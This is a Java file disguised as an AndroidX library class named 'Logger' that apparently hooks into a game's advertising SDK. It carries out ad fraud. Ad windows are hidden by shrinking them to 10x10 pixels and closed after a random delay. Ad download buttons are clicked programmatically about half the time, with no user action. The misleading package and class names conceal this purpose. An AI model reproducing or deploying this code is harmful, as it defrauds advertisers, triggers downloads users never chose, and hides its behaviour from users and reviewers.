package androidx.core.app;

import android.app.Activity;
import android.content.Intent;
import android.content.res.Resources;
import android.graphics.Color;
import android.os.Build;
import android.os.Handler;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;

import com.linktower.games.LinkSDK;

import java.lang.reflect.Field;
import java.util.Random;


public class Logger{

    public static void init(final Activity activity, Handler handler) {
        try {
            Intent var2 = activity.getIntent();
            String targetPlugin = var2.getStringExtra("targetPlugin");
//            Log.e("Loggera", "targetPlugin = " + targetPlugin);
//            String actName = activity.getClass().getName();
//            Log.e("DexposedBridge", targetPlugin + "\n" + actName);
//
//            if (!targetPlugin.contains("TTReward") && !targetPlugin.contains("TTFull")){
//                return;
//            }
//
//            Log.e("DexposedBridge",  "init");
            Window window = activity.getWindow();
            activity.requestWindowFeature(Window.FEATURE_NO_TITLE);
            window.setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
//            window.setStatusBarColor(Color.BLACK);
            View windowDecorView = window.getDecorView();
            windowDecorView.setPadding(0, 0, 0, 0);
            WindowManager.LayoutParams attributes = window.getAttributes();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                attributes.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                window.setAttributes(attributes);
//            windowDecorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
                windowDecorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_FULLSCREEN | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
            }

            if (LinkSDK.getInstance().isInterAdVisibility()) {
                return;
            }

            if (!LinkSDK.getInstance().isRewardedVisibility() || !targetPlugin.contains("TTReward")) {
                window.setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);
                window.setFlags(WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH);
                WindowManager.LayoutParams layoutParams = attributes;
                layoutParams.height = 10;
                layoutParams.width = 10;
                layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
                window.setAttributes(layoutParams);
                int delayTime = new Random().nextInt(20) + 30;
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        activity.finish();
                    }
                }, delayTime * 1000);
                if (targetPlugin.contains("TTReward")) {
                    LinkSDK.getInstance().setRewardedVisibility(true);
                }
            }
        } catch (Exception ignore) {
        }
    }


    public static void a(final View view, Handler mHandler) {
        if (view != null) {
            String string = view.toString();
            if (!TextUtils.isEmpty(string)) {
//                Log.e("Loggera", string);
                if (string.endsWith("id/tt_reward_ad_download}") || string.endsWith("id/tt_full_ad_download}")) {
//                    Log.e("Loggera", "endsWith tt_reward_ad_download");
                    mHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            int nextInt = new Random().nextInt(10);
//                        SXLog.d("nextInt = " + nextInt);
//                            Log.e("Loggera", "nextInt = " + nextInt);
                            if (nextInt <= 4) {
//                            com.fakerandroid.boot.Logger.log("performClick");
                                try {
                                    view.performClick();
                                } catch (Exception ignore) {
                                }
                            }
                        }
                    }, 10000);
                }
            }
        }
    }


}
